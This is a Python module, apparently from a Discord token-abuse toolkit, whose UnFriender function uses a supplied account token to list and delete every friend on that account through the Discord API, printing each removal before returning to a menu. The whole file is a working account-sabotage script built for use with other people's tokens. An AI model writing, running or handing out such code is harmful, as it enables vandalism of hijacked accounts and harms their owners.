import requests
import json
import Mark

from colorama import Fore

from util.plugins.common import print_slow, getheaders, proxy

def UnFriender(token):
    #get all friends
    count = 0
    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"ftp": f'{proxy()}'}, headers=getheaders(token)).json()
    for friend in friendIds:
        try:
            #Delete all friends they have
            requests.delete(
                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], proxies={"ftp": f'{proxy()}'}, headers=getheaders(token))
            count += 1
            print(f"{Fore.GREEN}Removed friend: {Fore.WHITE}"+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    print_slow(f"{Fore.LIGHTGREEN_EX}Successfully removed {count} friends! ")
    print("Enter anything to continue. . . ", end="")
    input()
    Mark.main()